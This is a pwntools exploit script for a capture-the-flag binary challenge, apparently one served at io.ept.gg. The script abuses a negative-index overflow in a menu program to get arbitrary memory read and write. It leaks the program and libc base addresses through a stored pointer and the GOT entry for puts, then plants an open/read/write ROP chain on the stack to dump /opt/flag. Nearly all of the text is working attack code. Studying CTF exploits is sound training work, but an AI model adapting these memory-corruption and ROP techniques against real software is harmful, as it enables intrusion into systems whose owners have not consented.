#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./thing')
libc = ELF('./libc-2.35.so')
context.terminal=['tmux', 'split-window', '-h']

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
handle SIGALRM ignore
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# Be able to send an overflowed negative index.
def SendIndex(x):
    io.sendlineafter(b'index: ', str(0x100000000+x).encode())

def Write(Index, Value):
    io.sendlineafter(b'> ', b'2')
    SendIndex(Index)
    if (len(Value) == 0x10):
        io.sendafter(b'value: ', Value[:0x0f])
    else:
        io.sendlineafter(b'value: ', Value)

def View(Index):
    io.sendlineafter(b'> ', b'4')
    SendIndex(Index)

# View value at index - then extract the output
def LeakAdr(Index):
    View(Index)
    leek = u64(io.recvline().strip().ljust(8, b'\0'))
    return leek

### Leak the pointer
leek = LeakAdr(-11)
exe.address = leek - 0x4008
log.info(f"leek: {hex(leek)}")
log.info(f"exe: {hex(exe.address)}")

def WriteAdr(Where, What):
    Write(-11, p64(leek)+p64(Where))    
    Write(-10, What)
    
def ReadAdr(Where):
    Write(-11, p64(leek)+p64(Where))    
    View(-10)
    return u64(io.recvline().strip().ljust(8, b'\0'))

puts = ReadAdr(exe.got['puts'])
libc.address = puts - libc.sym.puts
log.info(f"libc @ {hex(libc.address)}")
environ = ReadAdr(libc.sym.environ)
log.info(f"envi @ {hex(environ)}")

flagpath = leek+0x200
flagbuffer = leek+0x210
WriteAdr(flagpath, b'/opt/flag\0')
rop = ROP(libc)
rop.open(flagpath, 0)
rop.read(3, flagbuffer, 128)
rop.write(1, flagbuffer, 128)

print(rop.dump())

payload = bytes(rop.chain())

for IDX,WAT in enumerate([ payload[i:i+16] for i in range(0,len(payload),16) ]):
    WriteAdr(environ - 0x120 + 16*IDX, WAT)

io.sendlineafter(b'> ', b'666');

io.interactive()

